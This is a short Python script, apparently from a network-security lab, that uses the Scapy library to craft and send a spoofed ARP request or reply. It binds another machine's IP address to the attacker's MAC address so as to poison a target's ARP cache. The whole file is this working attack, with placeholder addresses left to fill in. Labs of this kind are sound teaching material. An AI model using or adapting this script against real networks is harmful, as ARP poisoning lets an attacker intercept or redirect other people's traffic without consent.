  #!/usr/bin/python3
from scapy.all import *

M01_MAC = "aa:bb:cc:dd:ee:ff"  #Replace with MAC address of Machine 1
M02_IP = "1.1.1.1" #Replace with IP address of Machine 2
M03_IP = "1.1.1.1" #Replace with IP address of Machine 3

E = Ether()
E.dst = "xx.yy.zz.dd.ee.ff" #Replace with destination MAC address
E.src = M01_MAC

A = ARP()
A.psrc = M03_IP
A.pdst = M02_IP
A.hwsrc = M01_MAC
A.op = 1 #Using ARP Request

#Comment the line above and uncomment the line if you wish to use ARP Reply instead
#A.op = 2

pkt = E/A
sendp(pkt)
ls(A)
